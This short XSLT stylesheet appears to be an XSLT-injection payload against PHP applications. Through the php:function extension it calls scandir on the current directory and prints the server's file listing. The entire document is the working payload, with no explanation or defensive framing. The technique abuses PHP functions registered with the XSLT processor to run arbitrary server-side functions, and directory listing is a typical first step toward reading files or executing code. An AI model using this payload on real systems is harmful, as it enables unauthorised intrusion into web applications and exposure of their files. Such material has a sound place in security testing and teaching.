<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
      xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
      xmlns:php="http://php.net/xsl">

  <xsl:template match="/">
    <pre>
<xsl:variable name="fileContents" select="php:function('scandir', '.')" />
<xsl:value-of select="php:function('implode', '&#10;', $fileContents)" />
    </pre>
  </xsl:template>

</xsl:stylesheet>
